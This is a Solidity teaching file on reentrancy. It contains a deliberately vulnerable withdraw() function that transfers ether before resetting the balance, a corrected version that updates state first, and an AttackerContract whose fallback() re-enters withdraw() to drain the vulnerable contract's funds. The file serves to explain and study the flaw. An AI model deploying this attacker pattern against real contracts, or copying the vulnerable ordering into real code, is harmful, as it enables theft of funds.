//SPDX-License-Identifier:MIT

pragma solidity ^0.8.7;

/**
 * @notice We test concept of Reentrancy attack
 * @dev Reentrancy is when a exploiter takes advantage of re-entering a contract 
 * @dev with some state variables reflecting older state 
 * @dev when some storage data is not updated & you re-enter a function that calls same storage
 * @dev function executes as if nothing has happened. This introduces major vulnerabilities
 */
contract VulnerableContract1{

    // mapping that stores balance for a given address
    mapping(address => uint256) public s_balances;

    // this is straight forward deposit function
    // updates mapping when eth is deposited into address (payable function)
    function deposit() external payable {
        s_balances[msg.sender] += msg.value;
    }

    // Perfect candidate for reentrancy attack
    // problem here is that we use the 'call' function on sender address
    // this triggers a receive() or fallback() function 
    // both are low level functions 
    // notice that the balances for the sender address are reset to 0 ONLY AFTER we get 'success' response from call function

    function withdraw() external payable {

        uint256 balance = s_balances[msg.sender];

        // this condition should have been the fail safe
        // unfortunately when fallback() function calls withdraw() again
        // this does not throw an error -> because balance is still > 0 
        require(balance > 0, "No balance in account");
        
        // at this point, this contract loses control
        // calling msg.sender.call calls the fallback() function defined in msg.msg.sender
        // this contract is actively giving control to msg.msg.sender
        // msg.sender fallback() function will again call withdraw() function
        (bool success, ) = msg.sender.call{value: balance}("");

        require(success, "Failed to transfer eth");

        // this is the source of vulnerability
        // although condition is perfectly defined, its positioning is wrong
        // since this will be executed after msg.sender.call, an exploiter can program
        // in such a way that logic never reaches here till all funds are drained from contract
        s_balances[msg.sender] = 0;

    }

    // this is the right way of writing above function
    // any external calls should be made at the end 
    // state variables are updated before external calls
    function withdrawCorrected() external payable {
        
        uint256 balance = s_balances[msg.sender];
        require(balance > 0, "No balance in account");

        // balances updated before we external call in next step
        s_balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to transfer eth");
    }

    // gets balance for this address
    function getBalance() public view returns(uint256){
        return address(this).balance;


    }

}

/**
 * @dev Attacker contract has a function that exploits the above vulnerability
 * @dev Exploit is done via fallback() function
 */
contract AttackerContract{

    VulnerableContract1 public vulnerableContract;

    // constructor is payable so we can deposit funds into contract upfront
    constructor(address vulnerableContractAddress) payable {
        vulnerableContract = VulnerableContract1(vulnerableContractAddress);
    }

    // we deposite 1 ether into the vulnerable contract
    // and then withdraw() function drains all funds in vulnerable contract
    // this is executed via fallback() function below
    function attacker() public payable{
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();

    }

    // notice that we are exploiting the old state that is yet to be updated
    // 
    fallback() external payable {
        // this keeps running in a loop till all funds are drained
        if(address(vulnerableContract).balance >= 1 ether){
            vulnerableContract.withdraw();
        }
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

}
